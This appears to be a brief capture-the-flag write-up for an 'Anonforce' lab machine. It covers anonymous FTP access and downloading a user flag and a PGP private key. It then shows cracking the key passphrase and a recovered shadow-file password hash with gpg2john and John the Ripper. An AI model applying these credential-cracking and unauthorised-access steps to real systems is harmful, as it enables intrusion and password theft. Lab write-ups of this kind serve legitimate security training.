# Anonforce
```
export ip = 10.10.3.171
```

## SCAN
```
21 FTP 
22 SSH
```

## FTP 
```
FTP is allowed Anonymous Login
  drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread

  - get backup.php
  - get private.asc

get user txt
1. cd /home/melodias/user.txt
2. get user.txt
```

## PGP Crack
```
How to Crack "*.asc" file

1. sudo gpg2john *.asc > hash
2. john hash --wordlist={{Password File}}

Crack Password is 'xbox360' 
```
## How to Read backup.pgp
```
1. gpg --decrypt backup.pgp
--> Password is 'xbox360' 
```

## Get Credential 
```
Credential File : credentialCrack/credential
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
```

## Credential Crack
```
john credential --wordlist={{rockyou.txt}}
```

# Done
